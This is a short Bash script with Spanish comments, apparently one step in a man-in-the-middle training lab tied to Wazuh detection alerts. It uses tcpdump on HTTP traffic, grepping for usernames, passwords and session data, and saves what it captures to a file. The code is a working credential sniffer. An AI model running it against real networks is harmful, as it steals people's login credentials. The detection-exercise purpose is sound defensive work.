#!/bin/bash
# 04_http_intercept.sh - Captura credenciales HTTP
# MITRE ATT&CK T1040
# Requiere: 02_arp_poison.sh activo
source /opt/mitm-scripts/targets.sh

IFACE="${1:-eth0}"

echo "[*] === INTERCEPTACION HTTP ==="
echo "[*] Capturando credenciales en claro sobre HTTP..."
echo "[!] Observa alertas en Wazuh: SID 9000005 y 9000006"
echo ""

tcpdump -i $IFACE -A -s 0 \
  "tcp port 80 and host $WEBSERVER_IP" \
  | grep --line-buffered -E "(POST|username|password|login|session)" \
  | tee /tmp/http_credentials_$(date +%Y%m%d_%H%M%S).txt
